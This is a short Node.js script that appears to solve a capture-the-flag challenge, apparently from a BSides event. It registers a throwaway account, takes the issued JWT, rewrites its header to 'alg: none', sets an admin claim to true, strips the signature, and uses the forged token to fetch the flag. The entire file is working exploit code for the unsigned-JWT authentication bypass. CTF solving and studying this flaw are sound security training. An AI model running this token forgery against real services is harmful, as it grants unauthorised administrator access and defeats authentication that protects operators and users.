const uuidv4 = require("uuid/v4");
const fetch = require("node-fetch");

const baseBackendUrl = process.env.SIGNED_SEALED_BASE_BACKEND_URL;

const atob = encoded => {
  return Buffer.from(encoded, "base64").toString("ascii");
};

const btoa = plaintext => {
  return Buffer.from(plaintext, "ascii").toString("base64");
};

const solve = async () => {
  const authReq = {
    method: "POST",
    body: JSON.stringify({
      username: uuidv4(),
      password: uuidv4()
    })
  };

  await fetch(baseBackendUrl + "/users", authReq);

  const loginResp = await fetch(baseBackendUrl + "/token", authReq);
  const { jwt } = await loginResp.json();

  const jwtParts = jwt
    .split(".")
    .slice(0, 2)
    .map(v => JSON.parse(atob(v)));

  jwtParts[0].alg = "none";
  jwtParts[1].bsides_is_admin = true;

  const alteredJWT = jwtParts.map(v => btoa(JSON.stringify(v))).join(".") + ".";

  const flagResp = await fetch(baseBackendUrl + "/flag", {
    headers: { Authorization: "Bearer " + alteredJWT }
  });

  const { flag } = await flagResp.json();

  console.log(flag);
};

solve();
